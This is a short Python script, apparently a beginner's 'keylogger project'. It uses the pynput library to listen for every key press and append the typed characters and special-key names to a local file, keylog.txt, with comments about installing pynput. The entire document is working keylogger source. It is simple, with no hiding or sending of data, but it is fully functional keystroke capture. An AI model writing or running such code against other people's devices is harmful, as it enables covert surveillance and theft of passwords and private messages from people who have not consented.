# We are going to start working on the keylogger project.
# Let's get started

from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as logkey:
        try:
            char = key.char
            if char:  # Ensure char is not None before writing
                logkey.write(char)
        except AttributeError:
            # Handle special keys (like Shift, Ctrl, etc.)
            logkey.write(f'[{key.name}]')

if __name__ == "__main__": 
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    listener.join() 



# if pynput is not installed, first install the pynput then run the code
# I also dont have the pynput installed so I will first installed in my laptop then running the code.
